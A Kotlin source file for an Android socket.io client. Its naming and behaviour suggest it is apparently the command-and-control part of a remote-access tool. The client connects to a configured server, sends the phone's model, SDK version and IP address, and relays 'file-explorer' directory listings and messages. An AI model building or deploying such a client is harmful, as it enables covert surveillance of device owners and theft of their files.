package abyssalarmy.rainbow.RainbowNetwork

import abyssalarmy.rainbow.RainbowUtils.RainbowTools
import android.content.Context
import android.os.Build
import android.util.Log
import io.socket.client.IO
import org.json.JSONArray
import org.json.JSONObject

class RainbowSocket(context: Context) {
    private val host = RainbowTools.rainbowConnectionData(context)
    private val socket = IO.socket(host, socketOptions())

    fun connect() {
        socket.connect()
    }

    fun addEventListener(event: String, message: (data: JSONObject) -> Unit) {
        socket.on(event) {
            message(it[0] as JSONObject)
        }
    }

    fun sendMessage(message:String){
        socket.emit("message",message)
    }

    fun sendFileExplorer(message: JSONArray){
        socket.emit("file-explorer",message)
    }

    fun sendPong(){
        socket.emit("ping","pong")
    }

    private fun socketOptions(): IO.Options? {
        val socketHeaders = mutableMapOf<String, MutableList<String>>()
        socketHeaders["model"] = arrayListOf(RainbowTools.getDeviceName())
        socketHeaders["version"] = arrayListOf(Build.VERSION.SDK_INT.toString() + " (SDK)")
        socketHeaders["ip"] = arrayListOf(RainbowTools.getIPAddress(true).toString())
        return IO.Options.builder().setExtraHeaders(socketHeaders).build()
    }
}